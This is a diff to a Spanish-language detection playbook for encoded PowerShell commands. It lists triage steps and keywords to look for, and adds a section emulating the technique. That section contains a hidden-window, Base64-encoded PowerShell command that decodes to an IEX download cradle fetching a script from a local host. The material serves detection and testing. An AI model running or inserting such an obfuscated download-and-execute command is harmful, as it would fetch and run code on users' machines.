@@ -22,3 +22,10 @@ Un atacante ejecutará PowerShell con el parámetro `-EncodedCommand` (o sus abr
 2. Decodificarlo usando CyberChef (From Base64) o PowerShell (`[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("..."))`).
 3. Analizar el script decodificado en busca de URLs, IPs o palabras clave maliciosas (ej. `DownloadString`, `IEX`, `Invoke-WebRequest`).
 4. Escalar a Incidente si el script intenta descargar contenido de Internet o acceder a recursos compartidos.
+
+## Emulación de la Técnica
+Para validar esta detección, se ejecutó el siguiente comando en el endpoint Windows (simulando la técnica T1059.001):
+```powershell
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=
+```
+*(El comando decodificado intenta ejecutar: `IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/payload.ps1')`)*
